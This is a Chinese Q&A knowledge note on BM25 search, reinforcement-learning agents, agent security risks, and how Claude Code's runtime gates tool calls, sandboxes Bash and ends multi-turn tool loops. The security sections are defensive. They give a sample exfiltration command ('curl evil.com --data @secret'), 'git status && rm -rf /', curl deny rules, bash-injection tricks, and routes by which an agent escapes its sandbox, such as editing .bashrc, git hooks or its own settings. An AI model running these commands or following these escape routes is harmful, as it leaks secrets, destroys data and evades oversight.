# Agent 检索、强化学习、安全与多轮工具调用问答

> 来源：2026-07-08 与 Sakana 的对话整理。目标是把当天讨论过的 BM25、RL Agent、Agent 安全风险、Claude Code 安全实现、多轮工具调用终止条件，整理成可复用 knowledge。
>
> 相关源码参照：`/home/azureuser/.openclaw/workspace/claude-code`。

---

## 1. BM25 是什么？

**问：BM25 是什么？**

答：BM25 是一种经典全文搜索排序算法，用来判断“某篇文档和用户查询有多相关”。

一句话：

```text
BM25 = 改进版 TF-IDF，用词频、逆文档频率、文档长度归一化给搜索结果打分。
```

它常用于：

- 搜索引擎
- 数据库全文检索
- 日志检索
- RAG 第一阶段召回
- 代码/文档检索

核心思想：

```text
相关性 = 查询词是否出现
       + 出现多少次但不无限加分
       + 查询词是否稀有
       + 文档长度是否合理
```

---

## 2. BM25 解决了什么问题？

**问：为什么不能只看关键词是否出现？**

答：因为只看关键词是否出现太粗糙。

比如查询：

```text
agent memory
```

三篇文档都包含关键词：

```text
A: agent memory design
B: agent agent agent agent memory memory
C: 一篇很长的文章里偶然出现 agent 和 memory
```

搜索系统要判断：

- 词出现多次通常更相关，但不能无限加分。
- 稀有词比常见词更重要。
- 长文档更容易碰巧命中，需要长度归一化。
- 查询中多个词要分别计分再相加。

BM25 正是在处理这些问题。

---

## 3. BM25 的核心因素有哪些？

**问：BM25 打分主要看什么？**

答：三个核心因素。

### 词频 TF

查询词在文档中出现越多，通常越相关。

但 BM25 有词频饱和：

```text
出现 1 次到 3 次提升明显；
出现 30 次到 50 次提升很小。
```

### 逆文档频率 IDF

越稀有的词越重要。

例如：

```text
the / is / file
```

区分度低。

```text
microcompact / tool_result / AgentTool
```

区分度高。

### 文档长度归一化

长文档天然更容易碰巧包含关键词，所以 BM25 会对超长文档做惩罚。

---

## 4. BM25 和向量检索有什么区别？

**问：BM25 与 embedding/vector search 的区别是什么？**

答：

| 维度 | BM25 | 向量检索 |
|---|---|---|
| 匹配方式 | 关键词/词项匹配 | 语义相似 |
| 擅长 | 精确词、代码符号、错误码、函数名 | 同义表达、概念相似 |
| 不擅长 | 不同表达但同一语义 | 精确字符串、罕见 token |
| 例子 | `AgentTool.tsx`, `ERR_MODULE_NOT_FOUND` | “模型调用工具后结果怎么返回” |

结论：代码和技术文档检索里，BM25 仍然很重要。

---

## 5. 为什么 RAG 常用 BM25 + 向量混合？

**问：RAG 为什么常做 hybrid search？**

答：因为 BM25 和向量检索互补。

典型流程：

```text
BM25 召回关键词精确命中文档
+ 向量检索召回语义相关文档
+ reranker 重新排序
```

适合：

- 技术文档
- 代码仓库
- agent memory
- 知识库问答

推荐理解：

```text
函数名、文件名、错误码 → BM25 强
概念、解释、同义问题 → 向量强
最后用 reranker 综合判断
```

---

## 6. BM25 有哪些现成实现？

**问：BM25 算法有哪些现成实现？**

答：按场景分。

### 生产搜索服务

- Elasticsearch：底层 Lucene，默认 BM25。
- OpenSearch：Elasticsearch fork，默认 BM25。
- Apache Solr：基于 Lucene。
- Apache Lucene：Java 搜索库本体。

适合生产级搜索、日志、文档检索、RAG hybrid。

### Python 轻量实现

- `rank-bm25`：最常见轻量库。
- Pyserini：Lucene/Anserini Python 接口，IR 评测常用。
- Gensim BM25：可用但新项目不首推。

### JS/TS 本地搜索

- MiniSearch：BM25-like，适合前端/Node 小型知识库。
- Lunr.js：经典静态站搜索。
- FlexSearch：高性能 JS 搜索库，不完全等同标准 BM25。

### Rust / Go

- Tantivy：Rust 类 Lucene 搜索库，支持 BM25。
- Bleve：Go 全文搜索库，支持 BM25-like scoring。

### 数据库

- SQLite FTS5：内置 `bm25()`，适合本地 agent memory。
- PostgreSQL FTS：默认不是标准 BM25，但可做全文排名，也可用扩展。
- DuckDB FTS：适合本地分析型全文检索。

### RAG 框架

- LangChain `BM25Retriever`
- LlamaIndex `BM25Retriever`

---

## 7. 本地 agent memory 推荐用什么 BM25 实现？

**问：如果做本地 agent memory 检索，BM25 该选什么？**

答：优先推荐：

```text
SQLite FTS5 bm25()
```

理由：

- 无需单独服务。
- 单文件持久化。
- SQL 易调试。
- 适合 Markdown-first memory。
- 索引坏了可以重建。

如果只是 Python 原型，可以用：

```text
rank-bm25
```

生产搜索服务再考虑 Elasticsearch / OpenSearch。

---

## 8. 基于强化学习的 Agent 与 Prompt Agent 有什么区别？

**问：基于强化学习的 Agent 与传统 Prompt Agent 有什么区别？**

答：核心区别是行为策略来源不同。

```text
Prompt Agent：靠 prompt / workflow / 规则告诉模型怎么做。
RL Agent：靠 reward signal 优化策略，让模型/策略学会怎么做。
```

Prompt Agent 像写 SOP：

```text
先读任务，再搜索文件，改完运行测试。
```

RL Agent 像训练实习生：

```text
做对加分，做错扣分，反复训练后形成策略。
```

更准确地说：

```text
Prompt 是接口层；RL 是策略优化层。
```

RL Agent 通常仍然需要 prompt，只是策略经过奖励优化。

---

## 9. RL Agent 的基本结构是什么？

**问：如何理解“基于强化学习的 agent”？**

答：强化学习 Agent 通常有：

```text
state → policy → action → environment → reward → update policy
```

对应到 LLM Agent：

- State：任务描述、文件内容、测试输出、浏览器状态、历史动作。
- Action：Read、Edit、Bash、Click、Search、Finish。
- Environment：代码仓库、网页、shell、数据库、机器人仿真等。
- Reward：测试通过、任务完成、用户接受、成本降低、错误惩罚。
- Policy：决定下一步做什么的模型或策略。

关键不在“用了 LLM”，而在：

```text
policy 被 reward 优化过。
```

---

## 10. RL Agent 具体训练什么？

**问：RL Agent 是训练 LLM 本体，还是训练工具选择策略？**

答：可能有三层。

### 训练 LLM 本体

例如 RLHF / RLAIF / GRPO / PPO，让模型更会推理、写代码、遵循指令或调用工具。

### 训练 Agent 策略模型

训练一个 policy 决定下一步：

```text
读文件？搜索？修改？运行测试？结束？
```

这个 policy 可以是 LLM、小模型、planner、tool selector 或 value model。

### 运行时在线学习

真实使用中根据用户接受/测试通过/任务失败继续更新策略。

但这很危险，真实产品里更常见的是：

```text
离线收集轨迹 → 打分 → 离线 RL/偏好优化 → 发布新模型/策略
```

而不是让 agent 在用户机器上随便在线改参数。

---

## 11. RL Agent 为什么难？

**问：为什么 RL Agent 不容易落地？**

答：主要难点：

1. **Reward 难定义**：测试通过不等于代码好；用户满意也很主观。
2. **Reward hacking**：agent 可能学会硬编码测试、跳过测试、修改评测条件。
3. **探索成本高**：现实世界不能乱试，尤其不能乱删库、乱付款、乱发邮件。
4. **长程 credit assignment**：50 步之后成功，很难知道第几步最关键。
5. **泛化风险**：训练环境有效，不代表真实环境也有效。
6. **安全对齐风险**：优化 reward 不等于优化人类真实意图。

所以 RL Agent 最适合：

```text
能模拟、能自动评分、能重复试错、失败成本低的场景。
```

---

## 12. RL Agent 有哪些落地应用？

**问：RL Agent 已经落地在哪些领域？**

答：按成熟度看：

### 很成熟

- 推荐系统 / 信息流 / 广告排序
- 广告竞价 / 营销预算优化
- 游戏 AI，例如 AlphaGo、AlphaZero、MuZero
- LLM 后训练：RLHF / RLAIF / GRPO 等

### 较成熟

- 数据中心冷却和能源优化
- 云资源调度 / Kubernetes 扩缩容
- 工业控制 / HVAC / 电网储能调度
- 机器人控制中的受控场景

### 正在快速落地

- 代码 Agent / 自动修 bug
- Tool-use Agent / API-use Agent
- 浏览器 Agent / Computer Use Agent
- 自动化测试修复
- 固定后台系统操作

### 谨慎落地或偏实验

- 自动驾驶局部决策
- 金融交易策略
- 医疗决策辅助
- 安全攻防演练
- 通用在线自学习 Agent

---

## 13. 为什么代码 Agent 很适合 RL？

**问：LLM Agent 里，为什么代码任务特别适合 RL？**

答：因为代码任务有相对明确、可验证的 reward。

例如：

```text
测试通过 +10
lint 通过 +2
hidden tests 通过 +20
patch 更小 +1
引入新失败 -10
改无关文件 -5
```

这类 reward 比“回答是否让用户满意”更客观。

代码 Agent 可以从大量轨迹中学习：

```text
任务 → 搜索 → 读文件 → 修改 → 测试 → 成功/失败
```

进而学到：

- 什么时候先复现测试。
- 什么时候先 grep。
- 什么时候读 stack trace。
- 什么时候不要大改。
- 什么时候运行局部测试而不是全量测试。

---

## 14. LLM Agent 中最现实的 RL 落地方向是什么？

**问：如果关注 OpenClaw / Claude Code 这类 agent，RL 最现实用在哪里？**

答：几类最现实：

1. **代码任务 RL**：测试、lint、CI、review 作为 reward。
2. **Tool-use RL**：训练模型什么时候调用搜索、读文件、bash、问用户。
3. **Workflow policy RL**：训练下一步做什么，而不是直接训练回答内容。
4. **Browser/Desktop Agent RL**：固定后台系统里训练 click/type/select 策略。
5. **Memory/Retrieval policy RL**：优化何时检索记忆、检索什么、是否写入长期记忆。

但不建议一上来做“完全在线自我进化”的通用 agent。风险高，收益不稳定。

---

## 15. Agent 开发中常见系统安全风险有哪些？

**问：Agent 开发中常见安全风险有哪些？**

答：主要包括：

1. **Prompt Injection / 间接提示注入**
2. **越权工具调用**
3. **沙箱逃逸**
4. **数据外泄 / secret exfiltration**
5. **MCP / 插件 / Skill 供应链风险**
6. **长期记忆污染**
7. **自动模式 / 无人值守误操作**
8. **权限规则过宽**
9. **外部消息/邮件/网页把不可信内容伪装成用户指令**

核心风险链路是：

```text
不可信输入 → 模型上下文 → 工具调用 → 文件/网络/命令/账号权限
```

Agent 安全的重点不是“模型会说错话”，而是“模型能把外部文本转成真实动作”。

---

## 16. Prompt Injection 应如何防范？

**问：Prompt Injection 怎么防？**

答：核心原则：

```text
外部内容只能当数据，不能当指令。
```

工程措施：

- 明确标记 untrusted content。
- 系统提示要求识别工具结果中的 prompt injection。
- 工具权限不能靠模型自觉，要由 runtime 强制。
- 高风险工具调用必须人工确认或策略校验。
- Web/email/issue/README/tool result 里的指令不能升级为系统指令。
- 对隐藏字符、Unicode smuggling 做清洗。
- 不让网页内容直接决定 shell 命令、网络请求、文件写入。

---

## 17. 越权执行如何防范？

**问：如何防止 agent 执行不该执行的动作？**

答：要做 runtime 级权限控制。

每个工具都应有：

```text
allow / ask / deny
```

按风险分级：

- Read/Search：低风险。
- Edit/Write：中风险。
- Bash/PowerShell：高风险。
- WebFetch/外部 API：高风险。
- SendMessage/Email/PR comment：高风险。
- 生产系统 API：最高风险。

不要只写：

```text
allow Bash
```

而应细化：

```text
allow Bash(git status)
allow Bash(npm test:*)
deny Bash(curl:*)
ask Bash(rm:*)
```

---

## 18. 沙箱逃逸如何防范？

**问：Agent 沙箱逃逸常见方式和防范是什么？**

答：常见逃逸路径：

- 修改 `.bashrc` / `.zshrc`。
- 修改 `.gitconfig` / git hooks / `.gitmodules`。
- 修改 agent 自己的 settings。
- 修改 MCP 配置。
- 修改 skills / commands / agents。
- path traversal / symlink / 大小写绕过。
- shell trick 绕过命令解析。
- 网络外传数据。

防范：

- OS 级 sandbox。
- 文件系统 allow/deny。
- 网络 allow/deny。
- 禁止写 agent 高权限配置目录。
- 路径规范化，处理 `..`、symlink、大小写、UNC path。
- shell 解析不能只用字符串前缀，要用 AST/semantics。
- sandbox override 必须显式授权。

---

## 19. Agent 数据外泄如何防范？

**问：Agent 可能通过哪些路径泄露数据？**

答：常见泄露路径：

- Bash：`curl evil.com --data @secret`
- WebFetch / HTTP API
- Git remote / issue comment / PR
- Slack/Discord/Email/Feishu 等消息工具
- 公网文件服务
- telemetry/logs
- 长期记忆写入 secrets

防范：

- 网络默认限制或域名 allowlist。
- 外发消息/邮件/评论必须确认。
- 工具日志脱敏。
- 禁止把 secret 写入 memory。
- 对 `.env`、SSH key、token 文件设置保护。
- 命令执行前做 exfiltration classifier。
- 只把必要片段传给模型。

---

## 20. Claude Code 的安全防护总体架构是什么？

**问：Claude Code 如何防范 Prompt Injection、越权执行和沙箱逃逸？**

答：Claude Code 不是只靠 prompt，而是多层 runtime gate。

核心执行链路：

```text
模型输出 tool_use
  → zod schema 校验
  → tool.validateInput()
  → PreToolUse hooks
  → permission check / classifier / user approval
  → sandbox 决策
  → tool.call()
  → PostToolUse hooks
  → tool_result 回灌
```

关键文件：

- `src/services/tools/toolExecution.ts`
- `src/hooks/useCanUseTool.tsx`
- `src/utils/permissions/permissions.ts`
- `src/utils/permissions/permissionSetup.ts`
- `src/tools/BashTool/*`
- `src/utils/sandbox/sandbox-adapter.ts`
- `src/tools/FileEditTool/FileEditTool.ts`
- `src/tools/WebFetchTool/WebFetchTool.ts`
- `src/utils/sanitization.ts`

核心思想：

```text
LLM 可以提出动作，但是否执行由 runtime 决定。
```

---

## 21. Claude Code 如何校验工具调用？

**问：Claude Code 执行工具前如何校验？**

答：先做 zod schema 校验：

```ts
const parsedInput = tool.inputSchema.safeParse(input)
```

如果模型参数不符合 schema，直接返回错误型 `tool_result`。

之后每个工具还有自己的：

```ts
tool.validateInput?.(...)
```

例如 FileEditTool 会检查：

- 文件是否先读过。
- 文件是否被外部修改过。
- `old_string` 是否存在且唯一。
- 是否试图编辑 notebook。
- 是否试图编辑 Claude settings。
- 是否引入 team memory secret。

---

## 22. Claude Code 的权限系统是什么？

**问：Claude Code 怎么决定工具能不能执行？**

答：统一 permission pipeline 返回：

```text
allow / ask / deny
```

如果不是 allow，工具不会执行，而是生成错误型 `tool_result` 回给模型。

关键路径：

- `src/hooks/useCanUseTool.tsx`
- `src/utils/permissions/permissions.ts`
- `src/services/tools/toolExecution.ts`

这意味着：

```text
模型不能自己决定“我有权限”。
```

---

## 23. Claude Code auto mode 有什么安全设计？

**问：auto mode 是不是自动批准所有动作？**

答：不是。

auto mode 会让 Claude 自动处理部分 permission prompts，但会检查 risky actions 和 prompt injection。

源码文案也警告：

```text
Claude can make mistakes that allow harmful commands to run,
it's recommended to only use in isolated environments.
```

`permissionSetup.ts` 里会识别危险权限，例如：

- `Bash`
- `Bash(*)`
- `Bash(python:*)`
- `Bash(node:*)`
- `PowerShell(*)`
- `Agent(...)`

因为这些会绕过 classifier 或允许任意代码执行。

---

## 24. Claude Code 如何防 Bash 命令注入？

**问：BashTool 有哪些安全检查？**

答：BashTool 是最高风险工具之一，所以有专门安全分析。

关键文件：

- `src/tools/BashTool/bashSecurity.ts`
- `src/tools/BashTool/bashPermissions.ts`
- `src/tools/BashTool/pathValidation.ts`
- `src/tools/BashTool/readOnlyValidation.ts`
- `src/tools/BashTool/shouldUseSandbox.ts`

会检查：

- `$()` command substitution
- backtick
- process substitution `<()` / `>()`
- `${}` parameter substitution
- zsh equals expansion `=cmd`
- zsh dangerous modules，例如 `zmodload`, `ztcp`, `zpty`
- heredoc substitution
- IFS injection
- `/proc/*/environ` access
- malformed token injection
- Unicode whitespace
- redirection trick
- quote/comment desync

还会拆 compound command，避免：

```bash
git status && rm -rf /
```

因为前半段安全就整体放行。

---

## 25. Claude Code 如何防危险删除？

**问：`rm -rf /` 这类命令如何防？**

答：`src/tools/BashTool/pathValidation.ts` 有：

```ts
checkDangerousRemovalPaths(...)
```

针对：

```text
rm / rmdir
```

会解析目标路径，命中危险目录时返回 `ask`。

源码注释强调：

```text
This prevents catastrophic data loss from commands like rm -rf /.
```

并且危险删除不能被普通 allow rule 自动绕过。

---

## 26. Claude Code sandbox 如何设计？

**问：Claude Code 的 sandbox 是怎么接入的？**

答：它使用外部包：

```text
@anthropic-ai/sandbox-runtime
```

适配层：

```text
src/utils/sandbox/sandbox-adapter.ts
```

Bash 是否进入 sandbox 由：

```text
src/tools/BashTool/shouldUseSandbox.ts
```

决定。

Sandbox 会处理：

- 文件系统 allow/deny。
- 网络 allow/deny。
- settings 转 sandbox runtime config。
- 禁止写 agent 自身高权限配置。

`sandbox-adapter.ts` 会默认 deny write：

- settings 文件
- managed settings drop-in dir
- `.claude/skills`
- 当前 cwd 中的 `.claude/settings.json`
- 当前 cwd 中的 `.claude/settings.local.json`

理由：skills 会被自动发现并加载，拥有高权限 prompt/workflow 影响力。

---

## 27. Claude Code 如何防编辑危险配置？

**问：Claude Code 是否防止模型改自己的配置？**

答：是。

`src/utils/permissions/filesystem.ts` 定义危险文件：

```ts
DANGEROUS_FILES = [
  '.gitconfig',
  '.gitmodules',
  '.bashrc',
  '.bash_profile',
  '.zshrc',
  '.zprofile',
  '.profile',
  '.ripgreprc',
  '.mcp.json',
  '.claude.json',
]
```

危险目录：

```ts
DANGEROUS_DIRECTORIES = [
  '.git',
  '.vscode',
  '.idea',
  '.claude',
]
```

FileEditTool 还会对 Claude settings 做 schema 校验：

```text
src/utils/settings/validateEditTool.ts
```

如果编辑前合法，编辑后必须仍然合法，否则拒绝。

---

## 28. Claude Code 如何防 hidden prompt injection？

**问：对不可见 Unicode 指令有什么防护？**

答：`src/utils/sanitization.ts` 专门防：

- ASCII smuggling
- hidden prompt injection
- Unicode tag characters
- zero-width chars
- private use chars
- noncharacters
- bidi control chars

核心函数：

```ts
partiallySanitizeUnicode(...)
recursivelySanitizeUnicode(...)
```

会做：

```ts
normalize('NFKC')
replace(/[\p{Cf}\p{Co}\p{Cn}]/gu, '')
```

并移除常见危险 Unicode 范围。

---

## 29. Claude Code 如何处理 untrusted workspace / MCP / Skills？

**问：Claude Code 对不可信工作区和扩展有什么边界？**

答：交互式 session 中有 Workspace Trust。

`src/interactiveHelpers.tsx` 注释明确说：

```text
The trust dialog is the workspace trust boundary
```

即使 bypassPermissions，也不跳过 workspace trust。

Trust 之后才会：

- prefetch system context
- MCP approval
- CLAUDE.md external includes warning
- repo path mapping
- apply config environment variables

MCP server 需要审批；MCP tool 名称使用 fully qualified name，避免伪装内置工具。

MCP skills 被视为 remote/untrusted，禁止 inline shell expansion。

---

## 30. Claude Code 多轮工具调用如何判断继续还是结束？

**问：在多轮工具调用中，如何判断下一步继续调用工具还是直接结束？**

答：核心判断是：

```text
assistant message 中是否出现 tool_use block。
```

有 `tool_use`：

```text
执行工具 → 生成 tool_result → 拼回上下文 → 下一轮模型调用
```

没有 `tool_use`：

```text
尝试结束，但先经过 recovery / stop hooks / token budget 检查
```

Claude Code 不依赖：

```text
stop_reason === "tool_use"
```

因为源码注释说它不可靠。

关键位置：

```text
src/query.ts
```

---

## 31. Claude Code 主循环是怎样的？

**问：Claude Code 的 agent loop 可以怎么抽象？**

答：可以简化成：

```ts
while (true) {
  assistantMessages = []
  toolUseBlocks = []
  toolResults = []

  for await (msg of callModel(messages)) {
    yield msg
    if (msg has tool_use) {
      toolUseBlocks.push(...)
    }
  }

  if (toolUseBlocks.length === 0) {
    if (canRecoverPromptTooLong()) continue
    if (hitMaxOutputTokens()) continue
    if (stopHooksBlock()) continue
    if (tokenBudgetSaysContinue()) continue
    return completed
  }

  for await (result of runTools(toolUseBlocks)) {
    yield result
    toolResults.push(result)
  }

  if (aborted) return aborted
  if (hookStopped) return hook_stopped
  if (maxTurnsReached) return max_turns

  messages = [...messages, ...assistantMessages, ...toolResults, ...attachments]
  continue
}
```

核心：

```text
LLM 输出 tool_use → 继续
LLM 不输出 tool_use → 尝试结束
runtime hooks/recovery 可以强制继续或停止
```

---

## 32. Claude Code 为什么不直接用 stop_reason 判断？

**问：为什么不用 `stop_reason === "tool_use"` 判断？**

答：因为源码认为它不可靠。

`src/query.ts` 注释：

```text
stop_reason === 'tool_use' is unreliable -- it's not always set correctly.
```

所以实际以内容块为准：

```text
是否真的收到 tool_use block
```

这更稳，因为 tool_use block 是模型实际请求执行工具的协议内容。

---

## 33. 一轮里多个工具调用如何执行？

**问：一轮模型输出多个 tool_use 怎么处理？**

答：由：

```text
src/services/tools/toolOrchestration.ts
```

里的 `runTools(...)` 处理。

它会用：

```ts
partitionToolCalls(...)
```

把工具调用分批：

```text
连续 concurrency-safe 工具 → 并发执行
非 concurrency-safe 工具 → 串行执行
```

源码注释：

```text
1. A single non-read-only tool
2. Multiple consecutive read-only tools
```

这样可以让 Read/Grep/Search 并发，但 Edit/Bash/Write 等有副作用的操作更保守。

---

## 34. 权限拒绝后流程会结束吗？

**问：如果工具权限被拒绝，会直接结束吗？**

答：通常不会。

权限拒绝会生成错误型 `tool_result`：

```json
{
  "type": "tool_result",
  "is_error": true,
  "content": "permission denied..."
}
```

然后进入下一轮模型调用。

模型看到错误后可以：

- 换一种方式。
- 请求用户授权。
- 放弃工具调用并总结。
- 调用其他工具。

所以权限拒绝是模型可见反馈，不是直接 crash。

---

## 35. 没有 tool_use 时为什么还可能继续？

**问：如果模型没有调用工具，为什么 runtime 还可能继续？**

答：因为还有 runtime recovery 和 policy。

没有 tool_use 后，Claude Code 还会检查：

- prompt-too-long recovery
- context collapse / reactive compact
- max output tokens recovery
- stop hooks
- token budget continuation

例如 stop hook 可以说：

```text
不行，还没跑测试。
```

runtime 会把 blocking error 注入上下文，然后再让模型继续一轮。

所以真正结束条件是：

```text
没有 tool_use
+ 没有 recovery 需要重试
+ stop hooks 没阻止
+ token budget 没要求继续
→ completed
```

---

## 36. 多轮工具调用的硬停止条件有哪些？

**问：如果模型一直调用工具，如何避免无限循环？**

答：Claude Code 有硬停止条件：

- `maxTurns`
- 用户 abort / Ctrl+C
- hook_stopped
- stop_hook_prevented
- blocking_limit
- model_error
- prompt-too-long recovery failed

每次执行工具并准备下一轮时：

```ts
const nextTurnCount = turnCount + 1
```

如果：

```ts
maxTurns && nextTurnCount > maxTurns
```

就返回：

```text
reason: 'max_turns'
```

---

## 37. 这组知识的总模型是什么？

**问：今天这组讨论能抽象成什么 agent 工程模型？**

答：Agent 工程不是只写 prompt，而是设计一个安全、可恢复、可评估的状态机。

核心组成：

```text
检索层：BM25 / vector / hybrid / reranker
策略层：prompt workflow / RL-optimized policy
执行层：tools / sandbox / permissions / hooks
反馈层：tool_result / test reward / user feedback
记忆层：short context / compact summary / long-term memory
安全层：prompt injection defense / least privilege / audit
循环层：tool_use → tool_result → next turn → stop condition
```

一句话：

```text
LLM 负责提出下一步意图；runtime 负责约束、执行、反馈、恢复和终止。
```
